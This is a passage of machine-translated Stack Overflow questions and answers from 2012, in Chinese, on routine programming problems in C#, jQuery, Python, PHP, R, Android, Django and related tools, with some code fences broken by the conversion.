foreach (DataRow row in customers.Rows)
{
    foreach (DataRow orderRow in row.GetChildRows(relation))
    {
        Response.Write(orderRow["OrderID"].ToString());
    }
} 
```

我得到了这个例外：该行不属于与此关系相同的 DataSet。

我究竟做错了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-09T18:04:23.553

您的**客户** `DataTable`不属于**customerOrders** `DataSet`。

您必须更改此代码片段

```
DataSet.CustomersDataTable customers = new DataSet.CustomersDataTable(); 
```

这样

```
DataSet.CustomersDataTable customers = customerOrders.Tables.Add("Customers"); 
```

# javascript - JQuery UI 可拖放/可拖放

> ID：13313434
> 
> 赞同：1
> 
> 时间：2012-11-09T17:57:51.337
> 
> 标签：javascript, jquery, html, jquery-ui, twitter-bootstrap

我在激活 JQuery UI 可拖动和可放置元素时遇到了困难。我正在使用 Twitter Bootstrap 和 Jinja2 进行模板化。这是我的html：

```
 <div class="well sidebar-nav">
        <ul class="nav nav-list">
          <li class="nav-header">communities</li>
          {% for community in communities %}
            <li class='draggable'><a href="http://localhost:8080/users/{{community}}">{{community}}</a></li>
          {% endfor %}         
        </ul>
      </div><!--/.well -->
      <div class="well sidebar-nav">
        <ul class="nav nav-list">
            <li class='droppable'><i class="icon-trash"></i><span class="label label-warning">trash</span></li>   
        </ul>
      </div><!--/.well --> 
```

我正在尝试使称为“社区”的侧边栏导航元素可拖动到称为“垃圾”的侧边栏导航中。这是JQuery：

```
$('.draggable a').on('mouseover', function(){
    $(this).draggable();
});

$('.droppable i').on('mouseover', function(){

    drop: function( event, ui) {

        $('#dialog').dialog()

    }

}); 
```

我使用 .on() 激活社区的原因是允许用户动态添加更多。我在这段代码中遇到的问题是它既没有激活可拖动对象也没有激活可放置对象，但是当我移动到控制台并使用 $('.draggable a').draggable() 激活可拖动对象时，它们被激活了。

我猜这个问题源于执行 JQuery 后加载的 html 元素。我将 JQuery 移到页面末尾并用 $(document).ready(function(){...}) 包围它，但没有效果。然后用 $(window).bind("load", function() {...}) 包围脚本，也没有效果。

我很茫然，希望能提供一些意见。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-09T18:59:54.087

首先，我相信您的问题可能是您没有调用`droppable()`可放置容器。您提供的 javascript 会产生错误，这可能是您的可放置和可拖动元素未激活的原因。这是一个示例，[jsfiddle](http://jsfiddle.net/zUVNs/)。它不漂亮，也没有考虑到 Bootstrap 或 Jinja2，但它展示了你所追求的。

没错，您需要确保在任何初始 DOM 修改 JS 之后执行可拖放的 js。我不相信致电`draggable()`或`droppable()`使用该`on()`活动可以为您购买任何东西。如果在脚本运行后添加了新的 DOM 元素，那么您仍然需要将`on()`事件附加到这些元素。您最好直接附加所需的 ui 操作并放弃该`on()`事件，除非我遗漏了某些内容并且您出于其他原因需要它们。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-09T19:29:11.747

将事件绑定到动态添加的元素上：尝试以这种方式使用 on() 方法：

```
$(document).on( 'mouseover', '.draggable a', function(){
    $(this).draggable();
}); 
```

代码的可删除部分也类似。

其次，为了让 droppable 工作：为什么不在代码的 droppable 部分使用与在 draggable 中使用的相同的模式？所以以这种方式调用 droppable：

```
$(document).on( 'mouseover', '.droppable i', function(){
    $(this).droppable();
}); 
```

所以直接使用 droppable() 方法而不是 drop 事件。

# c# - 如何在 Windows 8 (WinRT) 上从图像创建视频

> ID：13313438
> 
> 赞同：3
> 
> 时间：2012-11-09T17:58:00.550
> 
> 标签：c#, windows-runtime, video-processing, avi, directshow.net

我正在从图像文件列表中创建媒体文件。在桌面上，我们有不同的方法将图像文件拼接到视频中（AviFile lib、FFMPEG 和带有托管包装器的 DirectShow）。有没有办法在 WinRT 上使用这个库的 sme 或者可能存在另一种解决方案？

**更新**

我找到了解决方案。WinRT 组件使用媒体基础创建视频文件 [http://blogs.msdn.com/b/eternalcoding/archive/2013/03/06/developing-a-winrt-component-to-create-a-video-file-使用-media-foundation.aspx](http://blogs.msdn.com/b/eternalcoding/archive/2013/03/06/developing-a-winrt-component-to-create-a-video-file-using-media-foundation.aspx)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-10T21:59:17.290

我相信使用 Media Foundation 应该可以做到这一点，但我自己还没有这样做。他们确实在 //Build/ 中提到了一些 APIs - 检查这个：[http ://channel9.msdn.com/Events/Build/2012/3-106](http://channel9.msdn.com/Events/Build/2012/3-106)

# jquery - amplifyjs 解码器和 ajax beforeSend

> ID：13313439
> 
> 赞同：4
> 
> 时间：2012-11-09T17:58:29.020
> 
> 标签：jquery, amplifyjs

好的，正在努力获得放大解码器。奇怪的问题。如果我的请求附加了 beforeSend，则解码器不会触发。删除 beforeSend 和解码器触发。

这是两个例子。

1.  没有 beforeSend。

[http://jsfiddle.net/sujesharukil/Td2P4/12/](http://jsfiddle.net/sujesharukil/Td2P4/12/)

1.  使用 beforeSend

[http://jsfiddle.net/sujesharukil/Td2P4/14/](http://jsfiddle.net/sujesharukil/Td2P4/14/)

有人可以告诉我发生了什么吗？如果我有 beforeSend，为什么解码器不能工作？我假设解码器应该在收到请求后触发，所以 beforeSend 应该不会对其产生任何影响！

注意：stackoverflow 想让我在这里发布代码，而不仅仅是小提琴

 ``//please check the fiddles

```
amplify.request({
    resourceId: "testRequest",
    data: {
        json: JSON.stringify({
            text: 'hello world'
        })
    },
    success: function(data, status) {
        console.log(data, status);
        $('.messages').append('<div> text retrieved: ' + data.text + '</div>');
    },
    error: function(status, xhr) {
        console.log(xhr);
    }
});​ 
````  `帮助？

-苏杰

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-11-09T18:27:06.953

好的，想通了。

在 amplifyjs 这部分引起了我的注意

 `````
beforeSend : function( _xhr, _ajaxSettings ) {

                xhr = _xhr;
                ajaxSettings = _ajaxSettings;
                var ret = defnSettings.beforeSend ?
                    defnSettings.beforeSend.call( this, ampXHR, ajaxSettings ) : true;
                return ret && amplify.publish( "request.before.ajax",
                    defnSettings, settings, ajaxSettings, ampXHR );
            }
        }); 
````  `请注意，如果指定，它将调用 beforeSend，否则设置``var ret``为``true``

如果设置为true，它将发布``"request.before.ajax"``

在文件中，放大侦听此消息

 `````
amplify.subscribe( "request.before.ajax", function( resource, settings, ajaxSettings, ampXHR ) {
var _success = ampXHR.success,
    _error = ampXHR.error,
    decoder = $.isFunction( resource.decoder )
        ? resource.decoder
        : resource.decoder in amplify.request.decoders
            ? amplify.request.decoders[ resource.decoder ]
            : amplify.request.decoders._default;

if ( !decoder ) {
    return;
}

function success( data, status ) {
    _success( data, status );
}
function error( data, status ) {
    _error( data, status );
}
ampXHR.success = function( data, status ) {
    decoder( data, status, ampXHR, success, error );
};
ampXHR.error = function( data, status ) {
    decoder( data, status, ampXHR, success, error );
}; 
```

});`  `所以，如果你有一个 beforeSend 并且如果它没有返回 true，则消息永远不会发布，并且解码器永远不会被击中！

解决方案？

从你的 beforeSend 函数返回 true

 `````
amplify.request.define("testRequest", "ajax", {

url: "/echo/json/",
dataType: 'json',
type: 'POST',
decoder: function(data, status, xhr, success, error) {
    console.log('decoder fired');
    $('.messages').append('<div>decoder fired </div>');
    success(data);
},
beforeSend: function(xhr){
//not doing anything here, just logging;
    console.log('before send fired');
    $('.messages').append('<div>before send fired </div>');
    return true; //this is the key
} 
```

});`  `奇迹般有效！希望这可以帮助其他人试图解决这个问题！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-09T18:04:55.180

刚刚从示例页面复制了这个。希望能帮助到你。

```
amplify.request.decoders.appEnvelope =
    function ( data, status, xhr, success, error ) {
        if ( data.status === "success" ) {
            success( data.data );
        } else if ( data.status === "fail" || data.status === "error" ) {
            error( data.message, data.status );
        } else {
            error( data.message , "fatal" );
        }
    };

amplify.request.define( "decoderExample", "ajax", {
    url: "/myAjaxUrl",
    type: "POST",
    decoder: "appEnvelope" // <--- a function name(string) and not a function.
});

amplify.request({
    resourceId: "decoderExample",
    success: function( data ) {
        data.foo; // bar
    },
    error: function( message, level ) {
        alert( "always handle errors with alerts." );
    }
}); 
```````````

# python - 为什么 print(\a) 不能在 IDLE 中工作

> ID：13313440
> 
> 赞同：5
> 
> 时间：2012-11-09T17:58:35.567
> 
> 标签：python, macos, beep, beepbeep

**注意**我稍微改变了 q 使其不再重复。对不起。

我正在运行这些耗时的生物信息学脚本。我希望他们在完成后发出哔哔声。

我在 OS X 上。

在一个[类似的线程](https://stackoverflow.com/questions/6537481/python-making-a-beep-noise)中，我发现这`print '\a'`可能有效，但在空闲时，这只是打印`[]`

为什么这在 IDLE 中不起作用

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-09T18:01:56.903

它不发出哔哔声的原因是`\a`（或`^G`）是终端铃声代码；由处理标准输出的程序决定将其转换为声音。Terminal.app 将播放声音（除非您将其配置为“视觉铃声”，而不是完全关闭它），但 Idle 不会。而且，当然，如果您在没有 tty 的情况下运行，您将一无所获。

如果您不介意使用 PyObjC（在所有最新版本的 OS X 上都预装了 Apple 安装的 Python）：

```
import Cocoa
Cocoa.NSBeep() 
```

当然，这会播放 OS X 系统提示音，而不是终端铃声。除了可能是不同的声音之外，这意味着如果您禁用终端中的铃声，您的脚本仍然会发出哔哔声。（如果你真的想要一个终端铃声，你总是可以通过例如 ScriptingBridge 编写终端脚本。但我认为你不在乎。）

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-27T02:52:13.007

这个使用 afplay 的小 Python 片段可以满足我的需要：在程序结束时发出十声响亮的叮当声：

```
from os import system
for i in range(0,10):
    system('afplay /System/Library/Sounds/Glass.aiff') 
```

我认为导入系统的开销不小，但它对我有用

# python - 无需使用“If...Else 语句”即可从循环中计算属性的优雅且节省代码的方法

> ID：13313448
> 
> 赞同：2
> 
> 时间：2012-11-09T17:59:09.883
> 
> 标签：python, performance, optimization

我有一个 *.las 格式的文件，我想计算 Return1、Return2、...、Return5 的点数我使用 If...Else 语句，但我想了解是否有更优雅和代码保存。提前感谢您的帮助和提示。

```
 Return1 = 0
    Return2 = 0
    Return3 = 0
    Return4 = 0
    Return5 = 0
    count = 0
    for p in lasfile.File(inFile,None,'r'):
        count +=1
        if p.return_number == 1:
            Return1 += 1
        elif p.return_number == 2:
            Return2 += 1
        elif p.return_number == 3:
            Return3 += 1
        elif p.return_number == 4:
            Return4 += 1
        elif p.return_number == 5:
            Return5 += 1 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-09T18:04:23.513

您可以使用一个`dict`计数器（在这种情况下，它也可以是一个列表）。[`defaultdict`](http://docs.python.org/2/library/collections.html#collections.defaultdict)很方便：

```
from collections import defaultdict
returns = defaultdict(int)
count = 0
for p in lasfile.File(inFile, None, 'r'):
    count += 1
    returns[p.return_number] += 1 
```

**编辑：**我不确定 DSM 是否发布了带有[`Counter`](http://docs.python.org/2/library/collections.html#collections.Counter)示例的单独答案，所以我将在这里回复 OP 的问题：

> @DSM：我可以结合计数器吗？例如：如果我想同时计算 p.return_number 和 p.scan_angle – Gianni

`Counter`将计算你给它的迭代中的值。迭代应该是同质的。例如，如果`scan_angle`s 可以采用 、 等值`1`，`2`那么您不能`Counter`对两者都使用相同的值并获得正确的结果。如果这些值不重叠，您可以获得正确的结果，但您的代码将令人困惑且难以理解。我建议使用两个`Counter`'s：一个用于`return_number`s，一个用于`scan_angle`'s。您可以使用相同的循环轻松地填充两者（并且相同的代表`defaultdict`'s），但如果您想将创建和填充两个`Counter`'s 压缩到一个语句中，您将需要类似

```
from collections import Counter
rnc, sac = map(Counter, 
  zip(*((p.return_number, p.scan_angle) for p in lasfile.File(inFile,None,'r')))) 
```

请注意，至少在 Python 2 上它会生成一个列表，因此所有数据将在某个时间点同时保存在内存中。

然而，更简单的方法是：

*   使用两个`defaultdict`s：

    ```
    returns, angles = defaultdict(int), defaultdict(int)
    for p in lasfile.File(inFile, None, 'r'):
         returns[p.return_number] += 1
         angles[p.scan_angle] += 1
         count += 1 
    ```

*   `Counter`或在文件的两个不同读取中填充两个s：

    ```
    fp = lasfile.File(inFile, None, 'r')
    returns = Counter(p.return_number for p in fp)
    fp = lasfile.File(inFile, None, 'r')
    angles = Counter(p.scan_angle for p in fp) 
    ```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-09T18:02:21.453

使用字典：

```
return_counts = {1: 0, 2: 0, 3: 0, 4: 0, 5: 0}
count = 0
for p in lasfile.File(inFile,None,'r'):
    count +=1
    if 1 <= p.return_number <= 5:
        return_counts[p.return_number] += 1 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-09T18:04:00.107

假设`p.return_number`在 1-5 范围内

```
Return = [0, 0, 0, 0, 0]
for p in lasfile.File(inFile,None,'r'):
    Return[p.return_number-1] += 1 
```

# html - 如何使用谷歌地图在图像下添加按钮？

> ID：13313455
> 
> 赞同：0
> 
> 时间：2012-11-09T17:59:38.760
> 
> 标签：html

我是 HTML 新手。我有一张桌子和一张地图画布（Google Maps API）并排。我正在尝试在地图画布下添加一个按钮，以将地图的缩放/中心设置为默认值。问题是我不知道定位它的正确语法。

```
<body>
    <div>
        <table border="1", id="myTable", cellpadding="10", style="float:left">
        <tr>
          <th>Name of Business</th>
          <th>Latitude</th>
          <th>Longitude</th>
          <th>Center Map</th>
        </tr>
        </table>

        <div id="map_canvas" style="float:right;width:1024px;height:600px;border:black">

        </div>

        <button onclick="map.setCenter(myOptions.center), map.setZoom(9)", style="float:bottom">Recenter Map</button>
    </div>
</body> 
```

现在，“重新居中地图”按钮位于顶部，位于表格和地图画布之间。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-09T19:09:54.583

这与谷歌地图 api 无关**。**

它的基本html。

你应该先尝试谷歌。

无论如何，`<br>`在`div`.

* * *

好的，既然你知道，让我们快速分析一下你的代码。

*   不要用逗号分隔属性。( `<table border="1", id="myTable",`)
*   不要使用内联样式。( `style="float:left"`)
*   要并排放置 2 个 div，您应该设置`display: inline-block`.
*   如果您创建另一个 div，您可以将按钮放入，它将位于其他 div 下方。或者只是确保您的按钮`</div>`位于代码中的最后一个之后。

# javascript - Phonegap iOS 应用程序中的 Cookie

> ID：13313457
> 
> 赞同：1
> 
> 时间：2012-11-09T17:59:47.503
> 
> 标签：javascript, ios, cordova, cookies

只是想知道是否有人可以帮助我解决我们在 iOS 上遇到的 cookie 和 Phonegap 问题。

我在位于[http://domain.name/fishing/login的应用程序中调用了一个登录服务](http://domain.name/fishing/login)

它在我的设备上设置了一个名为“JSESSIONID”的cookie，路径为“/fishing/”。

未来对服务器的所有请求都包括该 cookie，一切都很正常。

但是，当我调用注销服务 (http://domain.name/fishing/logout) 时，它会清除服务器上的 JSESSIONID，但不会清除我设备上的。因此，以后每次与服务器通信的尝试都使用旧的 cookie 值并被拒绝访问。

即使我再次尝试登录，旧的 cookie 仍然存在，不会被新的 cookie 替换。

我试图通过javascript手动清除cookie但没有任何运气。我什至无法阅读它。也许是因为 webview 正在加载基于文件的文档并且与服务器不在同一个域中？

有什么建议/建议吗？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-12-24T04:14:46.893

You might want to have a look at the plugin [http://plugreg.com/plugin/bez4pieci/Phonegap-Cookies-Plugin](http://plugreg.com/plugin/bez4pieci/Phonegap-Cookies-Plugin)

# php - 为什么当类是动态属性时我无法访问类的静态属性

> ID：13313459
> 
> 赞同：0
> 
> 时间：2012-11-09T17:59:58.633
> 
> 标签：php

为什么我不能像这样通过 A 类的动态属性从 B 类调用常量？难道我做错了什么？

```
class A {
    public $class_b;
}

class B {
    const CONST_VAR = 'b';
}

$class_a = new A();
$class_a->class_b = new B();

echo $class_a->class_b::CONST_VAR; 
```

PHP 解析错误：语法错误，意外的 T_PAAMAYIM_NEKUDOTAYIM，期待 ',' 或 ';' 在第 14 行的 /root/1.php 中

但是这样称呼它很好：

```
$b = $class_a->class_b;
echo $b::CONST_VAR; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-09T18:52:38.907

类常量是静态的。您在 $class_b 变量中有一个类 B 的实例，因此您不应该通过类 A 访问它，除非您在类 B 中创建一个返回常量的非静态函数。例如：

```
class B {
    const CONST_VAR = 'b';

    function get_constant() {
        return self::CONST_VAR;
    }
} 
```

现在您可以使用：

```
 $class_a = new A();
 $class_a->class_b = new B();
 $class_a->class_b->get_constant(); 
```

但是实际上没有理由这样做，除非您计划重载 b 类，因为您可以只使用 B::CONST_VAR;

```
 echo B::CONST_VAR; // prints 'b' 
```

在此处阅读类常量：http: [//php.net/manual/en/language.oop5.constants.php](http://php.net/manual/en/language.oop5.constants.php)

应该注意的是，从 php 5.3.0 开始，可以通过实例访问常量，例如您建议的 $b::CONST_VAR，但这不是常量应该使用的方式，并且很可能只是为了支持糟糕的编程而添加的。

# c# - 使用 Kinect 识别句子中的关键字

> ID：13313460
> 
> 赞同：3
> 
> 时间：2012-11-09T18:00:03.800
> 
> 标签：c#, kinect, speech-recognition

我是第一次使用 Kinect 的用户，希望编写一个应用程序，当它听到句子中的特定关键字（或关键短语）时会做出响应。例如，如果短语是“that way”，我希望 Kinect 接受以下句子的匹配：

*   “是**这样**吗？”
*   “我应该走**这条路**吗？”
*   “**这种方式**正确吗？”

...等等。

在线查看文档，我的印象是 Kinect 只能通过`Grammar`类实现对话语的识别 - 本质上，我必须在编写此应用程序之前了解包含这些关键字/短语的所有话语，而不是能够只需在更大的未知话语中匹配关键字/短语。

这是准确的吗？或者有没有办法用 Kinect 做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-09T18:27:08.480

一般来说，是的——你的印象是正确的。

首先要指出的是，Kinect 实际上只是一个用于讲话的麦克风。它对语音处理没有任何作用，因此如果您找到一个更适合您需求的包，您就不必绑定到任何特定的库。

使用 Microsoft Speech 时，您必须更清楚要匹配的内容。寻找单个单词（例如，“Mary”和“Lamb”）并希望它能够找到短语（例如，“Mary had a little lamb”）将被证明是困难的。这里有两个链接可以让您很好地了解 Microsoft Speech 的功能：

*   [Microsoft 语音平台文档](http://msdn.microsoft.com/en-us/library/dd266409.aspx)
*   [语音识别语法规范版本 1.0](http://www.w3.org/TR/speech-grammar/)

第二个链接是一个非常好的链接，它将向您展示如何以一种可以让您更好地找到所需内容的方式来定制语法查找。例如，添加可选单词和替代短语。对于更复杂的语法，SRGS 格式的文件确实是（在我看来）超越代码的方法。

但所有的希望都没有丢失。Microsoft Speech 提供了一些可以帮助您的宝石...

**置信水平**- 您可以告诉引擎对词汇表宽容一点。如果您只是在 4-5 个单词的短语中寻找 2 个单词，这对您来说可能非常有效！Millage 取决于应用程序，所以我不能肯定它会满足您的需求......但它可能会有所帮助。

**Speech Hypothesized** - 除了 Speech Recognized 事件外，Microsoft Speech 还有一个 Hypothesized 事件。它有点松散，可以捕捉到较大短语的一部分。同样，millage 总是各种各样，所以我不能肯定这将是解决方案 [http://msdn.microsoft.com/en-us/library/system.speech.recognition.speechrecognizer.speechhypothesized.aspx](http://msdn.microsoft.com/en-us/library/system.speech.recognition.speechrecognizer.speechhypothesized.aspx)

最后一点，您可以查看诸如 Dragon Natural Speech 之类的软件包。像 Dragon 这样的公司已经付出了很多努力来创建能够让人们更自然地说话并且无需学习一套新短语的软件包。

# javascript - 使用侦听器删除 dom 元素会导致内存泄漏吗？

> ID：13313465
> 
> 赞同：3
> 
> 时间：2012-11-09T18:00:14.360
> 
> 标签：javascript, jquery, memory-leaks

假设我有这个 HTML：

```
<ul class="waka_waka">
  <li>Fozzy Bear</li>
  <li>Steve Martin</li>
  <li>John Candy</li>
</ul> 
```

...然后使用 jQuery 添加一个事件侦听器：

```
$('ul li').click(function() { console.log('waka_waka!!!'); }); 
```

如果突然在某个时候这样做：

```
$('.waka_waka').remove(); 
```

那些事件监听器会自动分离和释放吗？或者这实际上会导致内存泄漏吗？在删除之前删除这些侦听器是最佳做法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-09T18:02:11.207

根据 jQuery [DOCS](http://api.jquery.com/remove/) `remove`还删除了所有绑定的事件处理程序

> 除了元素本身，所有与元素关联的绑定事件和 jQuery 数据都将被删除。

但是看看这个问题[jQuery memory leak with DOM removal](https://stackoverflow.com/q/1462649/384985)，似乎有一次可能存在内存泄漏（请注意，这个问题已经很老了，所以现在应该已经解决了）。

# android - 在android上隐藏/显示xml

> ID：13313470
> 
> 赞同：1
> 
> 时间：2012-11-09T18:00:34.373
> 
> 标签：android, xml

我正在尝试创建一个隐藏/显示类似于“javascript 隐藏和显示”的 .xml 布局项目的功能？如果对象已在 xml 中声明，我该如何完成此操作？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-09T18:05:57.020

像这样的东西？

```
Button b=(Button)findViewById(R.id.my_button);
b.setVisibility(View.GONE); 
```

```
<Button
  android:id="@+id/my_button"/> 
```

将按钮更改为您想要更改其可见性的任何元素。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-09T18:06:04.743

只需更改视图的可见性。您需要定义一个侦听器以在和或[`View#setVisibility()`](http://developer.android.com/reference/android/view/View.html#setVisibility%28int%29)之间切换。`VISIBLE``GONE``INVISIBLE`

# r - 数据框的部分替换/更新

> ID：13313473
> 
> 赞同：2
> 
> 时间：2012-11-09T18:00:46.340
> 
> 标签：r, replace, dataframe, pattern-matching

我有以下代码：

```
set.seed(47)
df <- data.frame(V1 = sample(letters[1:5], size = 10, replace = TRUE),
                 V2 = 101:110)

partial_key <- data.frame(V1 = letters[1:3], V2 = 1:3)

> df
   V1  V2
1   e 101
2   b 102
3   d 103
4   e 104
5   c 105
6   d 106
7   b 107
8   c 108
9   c 109
10  e 110

> partial_key
  V1 V2
1  a  1
2  b  2
3  c  3 
```

我想用列中匹配的相应值替换`V2`in的值。非匹配项应保持原样。`df``partial_key``V1`

使用完整的密钥，我会使用`match`，它替换正确的值，但将不匹配的值替换为`NA`。

```
df[, "V2"] <- partial_key[match(df$V1, partial_key$V1), "V2"]
## Replaces too much 
```

我可以用 破解一个解决方案`%in%`，但是有更好的方法吗？更直观、更少打字的东西？

```
df[df$V1 %in% partial_key$V1, "V2"] <-
partial_key[match(df$V1[df$V1 %in% partial_key$V1], partial_key$V1), "V2"]
## Works, but is there a better way?
> df
   V1  V2
1   e 101
2   b   2
3   d 103
4   e 104
5   c   3
6   d 106
7   b   2
8   c   3
9   c   3
10  e 110 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-09T18:53:26.583

使用`%in%`是不必要的，因为输出`match`已经包含该信息。所以你可以做这样的事情：

```
replacement <- partial_key$V2[match(df$V1, partial_key$V1)]
df$V2 <- ifelse(is.na(replacement), df$V2, replacement) 
```

有时我希望 R 有一个`if.na`类似于 Excel 的基本功能`IFERROR`。我在我的 Rprofile 中有它：

```
if.na <- function(value, value.if.na) ifelse(is.na(value), value.if.na, value)
df$V2 <- if.na(replacement, df$V2) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-09T19:37:52.563

另一种解决方案：

```
comb <- rbind(df, partial_key)
df$V2 <- head(ave(comb$V2, comb$V1,
                  FUN = function(x) tail(x, 1)), -nrow(partial_key)) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-09T18:43:04.137

您可以合并，然后进行所需的重新排列

```
> mdf <- merge(df, partial_key, by="V1", all.x=TRUE)
> mdf$V2.x[!is.na(mdf$V2.y)] <- mdf$V2.y[!is.na(mdf$V2.y)]
> mdf
   V1 V2.x V2.y
1   b    2    2
2   b    2    2
3   c    3    3
4   c    3    3
5   c    3    3
6   d  106   NA
7   d  103   NA
8   e  101   NA
9   e  104   NA
10  e  110   NA
> mdf[-3]
   V1 V2.x
1   b    2
2   b    2
3   c    3
4   c    3
5   c    3
6   d  106
7   d  103
8   e  101
9   e  104
10  e  110 
```

# ios - Instagram 喜欢 Navbar + tableview

> ID：13313479
> 
> 赞同：1
> 
> 时间：2012-11-09T18:01:16.300
> 
> 标签：ios, uitableview, user-interface, uikit, instagram

我试图创建一个类似于 Instagram 主页的 tableview，特别是我在重新创建具有**所有**这 3 个功能的 UI 时遇到问题

```
1)Top navigation bar hides when tableview is scrolled up 
2)Top navigation bar does not bounce when table is scrolled all the way down
3)Section content bounces on scrolling down when the top navigation bar is out 
```

我已经尝试了所有已知形式的分段表视图，分段表视图中的分段表视图并尝试使用 scrollViewDidScroll 但无济于事。

# django - 限制对通用视图的访问

> ID：13313480
> 
> 赞同：0
> 
> 时间：2012-11-09T18:01:18.383
> 
> 标签：django, create-view

我有一个 creteView （然后是通用视图），它创建了一个表单，用户可以在其中放置数据并创建新对象。

现在，我想仅在我的函数返回 true 时限制对该页面的访问。这个函数没有考虑到用户，所以用户权限的装饰器不起作用。功能

```
is_allowed() 
```

在一天中的日期和时间做一些逻辑。

如何限制此功能的通用视图？我应该把控件放在哪里？

对于普通视图，这很容易：

```
if is_allowed(): 
```

所以我想是做这样的事情（其中View1是creteView）

```
def Home(request):
    if is_allowed():
        return View1.as_view() 
```

这样做我收到这条消息

```
'function' object has no attribute 'has_header' 
```

我能做些什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-09T18:15:04.193

有关于[装饰通用视图](https://docs.djangoproject.com/en/1.4/topics/class-based-views/#decorating-class-based-views)的文档。

您还可以覆盖 View 基类中的各种函数以添加您的检查。例如，您可能会覆盖[dispatch](https://docs.djangoproject.com/en/1.4/ref/class-based-views/#simple-generic-views)。

# javascript - 我可以从 jquery removeClass 模拟回调函数吗？

> ID：13313486
> 
> 赞同：8
> 
> 时间：2012-11-09T18:01:34.877
> 
> 标签：javascript, jquery, removeclass

我正在尝试连续执行这些 removeClass 调用。似乎没有使用 removeClass 的回调函数，所以有另一种方法来模拟它吗？

```
 $("#card1").removeClass('flip');

  //wait for card1 flip to finish and then flip 2
  $("#card2").removeClass('flip');

  //wait for card2 flip to finish and then flip 3
  $("#card3").removeClass('flip'); 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-09T18:04:26.803

看来您正在使用 CSS3 过渡来执行此操作。最简单的方法是手动设置延迟：

```
$("#card1").removeClass('flip');

setTimeout(function(){
   //wait for card1 flip to finish and then flip 2
   $("#card2").removeClass('flip');
}, 500);

setTimeout(function(){
   //wait for card2 flip to finish and then flip 3
   $("#card3").removeClass('flip');
}, 1000); 
```

没有内置的 jQuery 方法来检查 css 转换是否完成。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2019-05-21T09:23:00.693

Old Tread 但 Goolge 认识他 ;-)

jQueries UI 有一个用于 removeClass 的扩展函数。

```
<div class="big-blue"></div> 
```

```
$( "div" ).click(function() {
  $( this ).removeClass( "big-blue", 1000, "easeInBack", function(){
      // do fancy stuff after animation is completed
  });
}); 
```

jQuery-UI 文档：[http ://api.jqueryui.com/removeclass/](http://api.jqueryui.com/removeclass/)

# r - 用真假语句推进“for-loop”

> ID：13313487
> 
> 赞同：1
> 
> 时间：2012-11-09T18:01:38.803
> 
> 标签：r

我正在模拟标记重新捕获数据。在下面的简短示例中，我有一个矩阵，其中包含 3 个采样周期（列）内的 10 个个体（行）。我有一个矩阵跟踪它们是活着 (1) 还是死了 (0)，它们是否存在于研究区域 (1) 或不存在 (0)，以及我试图填写的矩阵，它说明它们是否存在每个时期捕获（1）或不捕获（0）。

在我的真实示例中，我有超过 1000 个人的 180 列，我想加快我的 for 循环。在下面的循环中（我循环遍历每个人和每一行），一旦发现当前个人已经死亡，我希望能够跳到下一个个人。我尝试使用 if/else 语句来执行此操作，如果“is.alive=/1”，它会将“j”的值（迭代采样周期）提升到最终值 3。我认为这会得到我晋级下一个人，但我最终得到

```
"Error in ifelse(is.alive == 1, ifelse(is.pres == 1, ifelse(runif(1) <=:
  unused argument(s) (j = 3)" 
```

有什么建议吗？

```
survival.mat<-matrix(1,10,3) #Matrix tracking 10 individuals (rows) over 3 time periods (columns)
survival.mat[c(2,4,6),c(2,3)]<-0 #Creating some deaths (1=alive, 0=dead)
present.mat<-survival.mat #A new matrix to see if individuals are present for capture
present.mat[c(1,5,8),2]<-0 #Making some alive individuals unavailable (0) for capture
capture.mat<-matrix(0,10,3) #A matrix to test if individuals were captured
capture.mat[,1]<-1 #All individuals captured on first occasion, since this is when they are marked
cap.prob<-0.5 #our probability of capture

    for(i in 1:10){  #Iterating through the rows (each row is an individual)
        for(j in 2:3){ #Iterating through columns (each column is a time period)

        is.alive <- survival.mat[i,j]
        is.pres <- present.mat[i,j]
        ifelse(is.alive==1,  #If the individual is alive, continue, if not jump ahead to 'j=3' which is what I am using to try to advance the loop
                                ifelse(is.pres==1,ifelse(runif(1)<=cap.prob,capture.mat[i,j]<-1,NA),NA)#If it is alive (previous statement), is it present for capture?  If so, run a capture coinflip.
                                 ,j=3) #Trying to advance the simulation to j = 3 if the individual is not alive
                                }
                        } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-09T18:14:04.933

所以这里发生了两件事：

1.  `ifelse`想要返回一个值，但您告诉它运行一个任务（赋值运算符`=`）。如果您想`j`在 ifelse 中更改为 3，您可以执行以下任一操作：

    ```
    ifelse(cond, true stuff, {j=3 ; j})
    ifelse(cond, true stuff, j <- 3) ## assigns 3 to j but also returns j 
    ```

2.  循环的工作方式`for`，您无需更改 的值`j`即可进入下一个循环，`R`并负责处理（与其他语言不同）。命令`next`(NOT `break`) 将带您进入下一次迭代，因此请执行以下操作：

    ```
    ifelse(cond, truestuff, next) 
    ```

# php - 原则：将 2 个请求合并为 1

> ID：13313491
> 
> 赞同：0
> 
> 时间：2012-11-09T18:01:52.860
> 
> 标签：php, symfony1, doctrine, symfony-1.4, doctrine-1.2

我想将这 2 个请求合并为 1，但我不知道如何执行此操作。任何的想法 ？

```
$productsCount = Doctrine::getTable('Product')
